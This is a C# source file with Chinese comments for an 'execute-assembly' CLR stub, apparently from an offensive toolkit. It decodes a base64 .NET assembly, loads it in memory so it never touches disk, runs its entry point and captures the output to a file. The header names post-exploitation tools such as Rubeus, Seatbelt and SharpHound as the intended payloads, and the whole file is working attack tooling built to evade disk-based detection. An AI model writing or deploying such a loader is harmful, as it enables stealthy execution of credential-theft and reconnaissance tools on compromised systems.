/*
 * csdev :: csdev_clr_stub.cs  --  execute-assembly 的 CLR 引导程序集
 * ==========================================================================
 * 为什么需要它:
 *   CLR hosting 的 ExecuteInDefaultAppDomain 只能调用
 *   `static int <Type>.<Method>(string)` 这一个签名, 而真实的 .NET 工具
 *   (Rubeus / Seatbelt / SharpHound ...) 入口都是 `static void Main(string[])`。
 *   因此用一个受控的引导程序集来承接参数, 再由它在内存里
 *   Assembly.Load(byte[]) + 反射调用目标入口点 —— 目标程序集**不落盘**。
 *
 * 参数约定 (单字符串, 以 '|' 分隔):
 *     <base64(目标程序集字节)>|<参数文本(空格分隔)>|<输出文件路径>
 * 返回: 目标入口点的返回值 (int), 失败时返回负错误码。
 *
 * 编译 (必须用 .NET Framework 的 csc, 保证目标机自带的 CLR 能加载):
 *     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
 *         /target:library /optimize+ /out:csdev_clr_stub.dll csdev_clr_stub.cs
 *
 * 注意: 本文件刻意只用 C# 5 语法 (Framework 4.x 的 csc 不支持更高版本)。
 * ==========================================================================
 */
using System;
using System.IO;
using System.Reflection;
using System.Text;

public class CsdevStub
{
    public static int Run(string arg)
    {
        string outPath = "";
        StringWriter capture = null;
        TextWriter savedOut = null;

        try
        {
            if (arg == null) return -1;

            string[] parts = arg.Split('|');
            if (parts.Length < 3) return -1;

            byte[] asmBytes = Convert.FromBase64String(parts[0]);
            string argText = parts[1];
            outPath = parts[2];

            string[] callArgs;
            if (argText.Length == 0)
            {
                callArgs = new string[0];
            }
            else
            {
                callArgs = argText.Split(' ');
            }

            Assembly asm = Assembly.Load(asmBytes);
            MethodInfo entry = asm.EntryPoint;
            if (entry == null)
            {
                Emit(outPath, "[-] 目标程序集没有入口点 (EntryPoint = null)");
                return -2;
            }

            ParameterInfo[] ps = entry.GetParameters();
            object[] invokeArgs;
            if (ps.Length == 0)
            {
                invokeArgs = null;
            }
            else if (ps.Length == 1 && ps[0].ParameterType == typeof(string[]))
            {
                invokeArgs = new object[] { callArgs };
            }
            else
            {
                Emit(outPath, "[-] 不支持的入口签名: " + entry.ToString());
                return -3;
            }

            // 把目标程序集的 Console 输出重定向到内存, 便于整体回传
            savedOut = Console.Out;
            capture = new StringWriter();
            Console.SetOut(capture);

            object ret;
            try
            {
                ret = entry.Invoke(null, invokeArgs);
            }
            finally
            {
                Console.SetOut(savedOut);
                savedOut = null;
            }

            StringBuilder sb = new StringBuilder();
            sb.Append(capture.ToString());
            if (ret != null)
            {
                sb.Append("\r\n[exit] ");
                sb.Append(ret.ToString());
            }
            Emit(outPath, sb.ToString());
            return (ret is int) ? (int)ret : 0;
        }
        catch (TargetInvocationException tie)
        {
            // 目标程序集抛出的异常: 打内部异常才是真正原因
            Exception inner = tie.InnerException != null ? tie.InnerException : tie;
            Emit(outPath, "[-] 目标程序集抛出异常:\r\n" + inner.ToString());
            return -98;
        }
        catch (Exception ex)
        {
            Emit(outPath, "[-] 引导层异常:\r\n" + ex.ToString());
            return -99;
        }
        finally
        {
            if (savedOut != null)
            {
                try { Console.SetOut(savedOut); } catch { }
            }
        }
    }

    private static void Emit(string path, string text)
    {
        if (path == null || path.Length == 0) return;
        try
        {
            File.WriteAllText(path, text == null ? "" : text, new UTF8Encoding(false));
        }
        catch
        {
            // 输出文件写不进去时只能放弃 —— 不能因此让 CLR 里抛出未捕获异常
        }
    }
}
